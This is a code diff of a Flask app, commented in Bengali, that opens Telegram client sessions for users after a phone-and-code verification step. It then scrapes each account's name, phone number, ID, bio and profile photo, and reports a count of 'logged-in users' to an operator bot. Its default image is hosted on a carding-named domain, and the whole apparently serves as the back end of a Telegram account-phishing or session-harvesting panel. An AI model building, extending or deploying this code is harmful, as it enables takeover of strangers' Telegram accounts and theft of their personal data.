@@ -193,7 +193,7 @@ def verify_code():
         return jsonify({"status": "error", "message": str(e)}), 400
 
 
-# ইউজারের টেলিগ্রাম প্রোফাইল ডাটা ফেচ করার জন্য API রাউট
+# ইউজারের টেলিগ্রাম প্রোফাইল ডাটা স্ক্যান ও ফেচ করার জন্য এপিআই রাউট
 @app.route('/get-user-profile', methods=['POST'])
 def get_user_profile():
     data = request.get_json(silent=True) or {}
@@ -213,21 +213,35 @@ def get_user_profile():
                 in_memory=True
             )
             await client.connect()
+            
+            # ইউজারের বেসিক ইনফো স্ক্যান করা
             me = await client.get_me()
             
+            # ইউজারের ফুল ইনফো (যেমন: bio) স্ক্যান করার চেষ্টা
+            full_user = None
+            try:
+                full_user = await client.get_users(me.id)
+            except Exception:
+                pass
+
+            # প্রোফাইল পিকচার স্ক্যান বা ডাউনলোড করা
             photo_url = None
             async for photo in client.get_chat_photos("me", limit=1):
-                file_path = await client.download_media(photo.file_id, file_name="static/profile.jpg")
+                file_path = await client.download_media(photo.file_id, file_name=f"static/profile_{me.id}.jpg")
                 photo_url = "/" + file_path
 
             await client.disconnect()
             
+            user_bio = "No Bio Available"
+            if full_user and hasattr(full_user, 'bio') and full_user.bio:
+                user_bio = full_user.bio
+
             return {
                 "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
                 "username": f"@{me.username}" if me.username else "No Username",
                 "id": me.id,
                 "phone": me.phone_number or phone,
-                "bio": "Telegram Verified Member",
+                "bio": user_bio,
                 "photo": photo_url or "https://carder.top/imagens/1791918460640-323067073.jpg"
             }
 
@@ -239,18 +253,47 @@ def get_user_profile():
         return jsonify({"status": "error", "message": str(e)}), 400
 
 
-# টেলিগ্রাম বটের ইনকামিং কমান্ড হ্যান্ডেল করার জন্য Webhook রুট
+# টেলিগ্রাম বটের ইনকামিং কমান্ড এবং ইনলাইন কিবোর্ড হ্যান্ডেল করার জন্য Webhook রুট
 @app.route(f'/{BOT_TOKEN}', methods=['POST'])
 def telegram_webhook():
     try:
         data = request.get_json(silent=True) or {}
+        
+        # ১. যদি ইউজার মেসেজ বা কমান্ড দেয় (যেমন: /start)
         if "message" in data:
             message = data["message"]
             chat_id = message["chat"]["id"]
             user_id = message["from"]["id"]
             text = message.get("text", "").strip()
 
-            if text == "/stats" or text == "/start":
+            if text == "/start":
+                welcome_text = (
+                    "👋 Welcome to User Info Robot!\n\n"
+                    "🤖 This bot provides user information and website registration statistics.\n\n"
+                    "📊 Monitor your website's registration activity and check how many members have registered on your website.\n\n"
+                    "🌐 *Website Statistics*\n"
+                    "View the total number of registered members on your website with just one click.\n\n"
+                    "👇 Click the button below to view the total registration count."
+                )
+                
+                keyboard = {
+                    "inline_keyboard": [
+                        [
+                            {"text": "📊 Total Registration Members", "callback_data": "get_total_members"}
+                        ]
+                    ]
+                }
+                
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                payload = {
+                    "chat_id": chat_id,
+                    "text": welcome_text,
+                    "parse_mode": "Markdown",
+                    "reply_markup": keyboard
+                }
+                requests.post(url, json=payload, timeout=15)
+
+            elif text == "/stats":
                 if user_id == ADMIN_ID or str(chat_id) == str(OWNER_CHAT_ID):
                     reply_msg = (
                         f"🤖 *Bot Status & Stats*\n\n"
@@ -258,8 +301,30 @@ def telegram_webhook():
                         f"✅ *System Status:* `Online & Running`"
                     )
                     send_telegram_message(chat_id, reply_msg)
+
+        # ২. যদি ইউজার ইনলাইন বাটনে ক্লিক করে (Callback Query)
+        elif "callback_query" in data:
+            callback_query = data["callback_query"]
+            callback_data = callback_query.get("data")
+            chat_id = callback_query["message"]["chat"]["id"]
+            callback_query_id = callback_query["id"]
+
+            if callback_data == "get_total_members":
+                total_members_str = f"{total_logged_in_users:,}"
+                
+                stats_text = (
+                    f"📊 *Website Registration Statistics*\n\n"
+                    f"👥 Total Registered Members: `{total_members_str}`\n\n"
+                    f"✅ Statistics updated successfully!"
+                )
+
+                answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+                requests.post(answer_url, json={"callback_query_id": callback_query_id, "text": "Statistics fetched!"}, timeout=10)
+
+                send_telegram_message(chat_id, stats_text)
+
     except Exception as e:
-        print("Webhook Error:", e)
+        print("Webhook Error:", traceback.format_exc())
     return "OK", 200
 
 
